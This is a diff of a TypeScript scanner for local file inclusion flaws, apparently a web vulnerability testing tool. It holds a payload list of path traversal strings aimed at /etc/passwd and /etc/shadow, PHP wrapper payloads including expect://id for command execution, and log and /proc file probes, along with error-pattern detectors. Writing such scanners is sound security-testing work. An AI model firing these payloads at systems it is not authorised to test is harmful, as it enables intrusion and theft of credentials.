@@ -47,11 +47,11 @@ const LFI_ERROR_PATTERNS = [
   /Warning.*include/i,
   /require\(\): failed opening required/i,
   /Fatal error.*include/i,
-  /file_get_contents/i, // Added
-  /fopen\(/i, // Added
+  /file_get_contents/i,
+  /fopen\(/i,
   
   // PHP wrappers exposure
-  /php:\/\/filter/i, // Added
+  /php:\/\/filter/i,
   /php:\/\/input/i,
   /data:\/\/text/i,
   /expect:\/\//i,
@@ -59,41 +59,41 @@ const LFI_ERROR_PATTERNS = [
 
 const LFI_PAYLOADS = [
   // Basic traversal (Linux/Unix)
-  { payload: '../../../../../../../etc/passwd', type: 'Path Traversal (Unix)', severity: 'critical' as const, confidence: 0.98 }, // Increased confidence
-  { payload: '....//....//....//....//....//....//etc/passwd', type: 'Path Traversal (Bypass)', severity: 'critical' as const, confidence: 0.95 }, // Increased confidence
+  { payload: '../../../../../../../etc/passwd', type: 'Path Traversal (Unix)', severity: 'critical' as const, confidence: 0.98 },
+  { payload: '....//....//....//....//....//....//etc/passwd', type: 'Path Traversal (Bypass)', severity: 'critical' as const, confidence: 0.95 },
   { payload: '..\\..\\..\\..\\..\\..\\..\\etc\\passwd', type: 'Path Traversal (Windows Style)', severity: 'high' as const, confidence: 0.85 },
   
   // Windows paths
-  { payload: '../../../../../../../windows/system32/drivers/etc/hosts', type: 'Path Traversal (Windows)', severity: 'critical' as const, confidence: 0.98 }, // Increased confidence
+  { payload: '../../../../../../../windows/system32/drivers/etc/hosts', type: 'Path Traversal (Windows)', severity: 'critical' as const, confidence: 0.98 },
   { payload: '..\\..\\..\\..\\..\\..\\..\\windows\\win.ini', type: 'Path Traversal (win.ini)', severity: 'high' as const, confidence: 0.9 },
-  { payload: 'C:\\windows\\system32\\drivers\\etc\\hosts', type: 'Absolute Path (Windows)', severity: 'critical' as const, confidence: 0.98 }, // Increased confidence
+  { payload: 'C:\\windows\\system32\\drivers\\etc\\hosts', type: 'Absolute Path (Windows)', severity: 'critical' as const, confidence: 0.98 },
   
   // Null byte injection (legacy PHP < 5.3)
-  { payload: '../../../../../../../etc/passwd%00', type: 'Null Byte Injection', severity: 'critical' as const, confidence: 0.9 }, // Increased confidence
-  { payload: '../../../../../../../etc/passwd%00.jpg', type: 'Null Byte + Extension', severity: 'critical' as const, confidence: 0.9 }, // Increased confidence
+  { payload: '../../../../../../../etc/passwd%00', type: 'Null Byte Injection', severity: 'critical' as const, confidence: 0.9 },
+  { payload: '../../../../../../../etc/passwd%00.jpg', type: 'Null Byte + Extension', severity: 'critical' as const, confidence: 0.9 },
   
   // URL encoding evasion
   { payload: '..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', type: 'URL Encoded Traversal', severity: 'high' as const, confidence: 0.9 },
   { payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', type: 'Double URL Encoded', severity: 'high' as const, confidence: 0.85 },
   
   // PHP wrappers
-  { payload: 'php://filter/convert.base64-encode/resource=index.php', type: 'PHP Filter Wrapper', severity: 'critical' as const, confidence: 0.98 }, // Increased confidence
-  { payload: 'php://input', type: 'PHP Input Stream', severity: 'critical' as const, confidence: 0.95 }, // Increased confidence
-  { payload: 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+', type: 'Data URI Wrapper', severity: 'critical' as const, confidence: 0.95 }, // Increased confidence
-  { payload: 'expect://id', type: 'Expect Wrapper (RCE)', severity: 'catastrophic' as const, confidence: 1.0 }, // Increased confidence
+  { payload: 'php://filter/convert.base64-encode/resource=index.php', type: 'PHP Filter Wrapper (Base64)', severity: 'critical' as const, confidence: 0.99 }, // Increased confidence
+  { payload: 'php://input', type: 'PHP Input Stream', severity: 'critical' as const, confidence: 0.95 },
+  { payload: 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+', type: 'Data URI Wrapper', severity: 'critical' as const, confidence: 0.95 },
+  { payload: 'expect://id', type: 'Expect Wrapper (RCE)', severity: 'catastrophic' as const, confidence: 1.0 },
   
   // Log poisoning vectors
-  { payload: '/var/log/apache2/access.log', type: 'Apache Log Access', severity: 'high' as const, confidence: 0.85 }, // Increased confidence
-  { payload: '/var/log/nginx/access.log', type: 'Nginx Log Access', severity: 'high' as const, confidence: 0.85 }, // Increased confidence
-  { payload: '../../../../../../../proc/self/environ', type: 'Proc Environ', severity: 'high' as const, confidence: 0.9 }, // Increased confidence
-  { payload: '/proc/self/cmdline', type: 'Proc Cmdline', severity: 'medium' as const, confidence: 0.8 }, // Added
-  { payload: '/proc/self/status', type: 'Proc Status', severity: 'medium' as const, confidence: 0.8 }, // Added
+  { payload: '/var/log/apache2/access.log', type: 'Apache Log Access', severity: 'high' as const, confidence: 0.85 },
+  { payload: '/var/log/nginx/access.log', type: 'Nginx Log Access', severity: 'high' as const, confidence: 0.85 },
+  { payload: '../../../../../../../proc/self/environ', type: 'Proc Environ', severity: 'high' as const, confidence: 0.9 },
+  { payload: '/proc/self/cmdline', type: 'Proc Cmdline', severity: 'medium' as const, confidence: 0.8 },
+  { payload: '/proc/self/status', type: 'Proc Status', severity: 'medium' as const, confidence: 0.8 },
   
   // Config files
-  { payload: '../../../../../../../etc/php/7.4/apache2/php.ini', type: 'PHP Config Access', severity: 'high' as const, confidence: 0.9 }, // Increased confidence
-  { payload: '/etc/apache2/apache2.conf', type: 'Apache Config', severity: 'high' as const, confidence: 0.9 }, // Increased confidence
-  { payload: '/etc/nginx/nginx.conf', type: 'Nginx Config', severity: 'high' as const, confidence: 0.9 }, // Added
-  { payload: '/etc/shadow', type: 'Shadow File Access', severity: 'catastrophic' as const, confidence: 1.0 }, // Added
+  { payload: '../../../../../../../etc/php/7.4/apache2/php.ini', type: 'PHP Config Access', severity: 'high' as const, confidence: 0.9 },
+  { payload: '/etc/apache2/apache2.conf', type: 'Apache Config', severity: 'high' as const, confidence: 0.9 },
+  { payload: '/etc/nginx/nginx.conf', type: 'Nginx Config', severity: 'high' as const, confidence: 0.9 },
+  { payload: '/etc/shadow', type: 'Shadow File Access', severity: 'catastrophic' as const, confidence: 1.0 },
   
   // Advanced bypass techniques
   { payload: '....//....//etc/passwd', type: 'Filter Bypass (Dot Slash)', severity: 'high' as const, confidence: 0.8 },
@@ -121,38 +121,21 @@ const checkLFISignature = (response: string): { found: boolean; pattern?: string
     };
   }
 
+  // High confidence for PHP filter wrapper success (base64 encoded content)
+  if (lowerResponse.includes('php://filter') && /<html/i.test(response) && /base64/i.test(response)) {
+    // If the response contains base64 encoded HTML, it means the filter wrapper worked.
+    return {
+      found: true,
+      pattern: 'PHP Filter Wrapper success (Base64 encoded content)',
+      confidence: 0.99,
+    };
+  }
+
   // High confidence for Windows INI file format (e.g., win.ini)
   if (/\[[a-z\s]+\]/i.test(response) && /;.*comment/i.test(response) && (response.includes('fonts') || response.includes('extensions'))) {
     return {
       found: true,
       pattern: 'Windows INI file format detected',
-      confidence: 0.95,
-    };
-  }
-
-  // High confidence for PHP config files
-  if (lowerResponse.includes('php.ini') && lowerResponse.includes('extension=') && lowerResponse.includes('allow_url_include')) {
-    return {
-      found: true,
-      pattern: 'PHP configuration file detected',
-      confidence: 0.95,
-    };
-  }
-
-  // High confidence for Apache config files
-  if (lowerResponse.includes('apache2.conf') && lowerResponse.includes('serverroot') && lowerResponse.includes('listen')) {
-    return {
-      found: true,
-      pattern: 'Apache configuration file detected',
-      confidence: 0.95,
-    };
-  }
-
-  // High confidence for Nginx config files
-  if (lowerResponse.includes('nginx.conf') && lowerResponse.includes('http {') && lowerResponse.includes('server {')) {
-    return {
-      found: true,
-      pattern: 'Nginx configuration file detected',
       confidence: 0.95,
     };
   }
@@ -245,22 +228,28 @@ export const performLFIScan = async (
 
           if (signatureCheck.found && signatureCheck.confidence >= 0.7) { // Only consider high confidence detections
             console.log(`[LFI Scan] ⚠️ ${severity.toUpperCase()}: LFI vulnerability detected! ${signatureCheck.pattern}`);
-            result.vulnerable = true;
             
-            const evidenceStart = text.toLowerCase().indexOf(signatureCheck.pattern?.toLowerCase() || '');
-            const evidence = evidenceStart >= 0
-              ? text.substring(Math.max(0, evidenceStart - 100), Math.min(text.length, evidenceStart + 300))
-              : text.substring(0, 400);
-            
-            result.vulnerabilities.push({
-              payload,
-              indicator: signatureCheck.pattern || 'File content exposed',
-              severity,
-              type,
-              evidence: evidence.substring(0, 400) + (evidence.length > 400 ? '...' : ''),
-              parameter: paramKey,
-              confidence: signatureCheck.confidence,
-            });
+            // Check if this specific vulnerability (payload + parameter) has already been recorded
+            const isDuplicate = result.vulnerabilities.some(v => v.parameter === paramKey && v.payload === payload);
+
+            if (!isDuplicate) {
+              result.vulnerable = true;
+              
+              const evidenceStart = text.toLowerCase().indexOf(signatureCheck.pattern?.toLowerCase() || '');
+              const evidence = evidenceStart >= 0
+                ? text.substring(Math.max(0, evidenceStart - 100), Math.min(text.length, evidenceStart + 300))
+                : text.substring(0, 400);
+              
+              result.vulnerabilities.push({
+                payload,
+                indicator: signatureCheck.pattern || 'File content exposed',
+                severity,
+                type,
+                evidence: evidence.substring(0, 400) + (evidence.length > 400 ? '...' : ''),
+                parameter: paramKey,
+                confidence: signatureCheck.confidence,
+              });
+            }
           }
 
           // Check for significant size changes, but with lower confidence if no signature
